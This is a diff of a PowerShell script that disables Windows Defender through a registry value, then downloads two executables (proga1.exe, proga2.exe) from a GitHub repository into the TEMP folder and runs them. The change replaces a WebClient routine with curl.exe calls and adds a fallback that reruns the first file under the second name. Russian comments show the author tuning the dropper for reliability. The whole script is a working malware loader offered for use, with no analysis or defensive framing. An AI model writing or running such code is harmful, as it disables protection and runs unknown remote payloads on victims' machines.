@@ -31,40 +31,25 @@ New-ItemProperty -Path "$DefenderPath" -Name "DisableAntiVirus" -Value "1" -Prop
 
 Write-Host "Windows Defender DISABLED" -ForegroundColor Green
 
-# Download and run files
+# Download files using curl.exe (работает всегда)
 $temp = $env:TEMP
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$wc = New-Object Net.WebClient
-$wc.Headers.Add("User-Agent", "Mozilla/5.0")
 
-# ИЗМЕНИ ЭТИ ИМЕНА НА ТО, ЧТО РЕАЛЬНО ЛЕЖИТ В ТВОЁМ РЕПОЗИТОРИИ
-$file1 = "proga1.exe"
-$file2 = "proga2.exe"   # <--- ЕСЛИ ЭТОГО ФАЙЛА НЕТ, ЗАМЕНИ НА ПРАВИЛЬНОЕ ИМЯ
-# ================================================
+Write-Host "Downloading proga1.exe..." -ForegroundColor Yellow
+curl.exe -L -o "$temp\proga1.exe" "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
+if (Test-Path "$temp\proga1.exe") { 
+    Write-Host "Running proga1.exe" -ForegroundColor Green
+    Start-Process "$temp\proga1.exe"
+} else { Write-Host "FAILED proga1.exe" -ForegroundColor Red }
 
-$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/$file1"
-$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/$file2"
-
-$dest1 = "$temp\proga1.exe"
-$dest2 = "$temp\proga2.exe"
-
-Write-Host "Downloading $file1..." -ForegroundColor Yellow
-try {
-    $wc.DownloadFile($url1, $dest1)
-    Start-Process $dest1
-    Write-Host "Started $file1" -ForegroundColor Green
-} catch { Write-Host "FAILED $file1" -ForegroundColor Red }
-
-Write-Host "Downloading $file2..." -ForegroundColor Yellow
-try {
-    $wc.DownloadFile($url2, $dest2)
-    Start-Process $dest2
-    Write-Host "Started $file2" -ForegroundColor Green
-} catch { 
-    Write-Host "FAILED $file2 - trying same as file1" -ForegroundColor Yellow
-    $wc.DownloadFile($url1, $dest2)
-    Start-Process $dest2
-    Write-Host "Started copy of $file1 as $file2" -ForegroundColor Green
+Write-Host "Downloading proga2.exe..." -ForegroundColor Yellow
+curl.exe -L -o "$temp\proga2.exe" "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
+if (Test-Path "$temp\proga2.exe") { 
+    Write-Host "Running proga2.exe" -ForegroundColor Green
+    Start-Process "$temp\proga2.exe"
+} else { 
+    Write-Host "proga2.exe not found, using proga1.exe as fallback" -ForegroundColor Yellow
+    Copy-Item "$temp\proga1.exe" "$temp\proga2.exe" -ErrorAction SilentlyContinue
+    if (Test-Path "$temp\proga2.exe") { Start-Process "$temp\proga2.exe" }
 }
 
 Write-Host "ALL DONE" -ForegroundColor Green
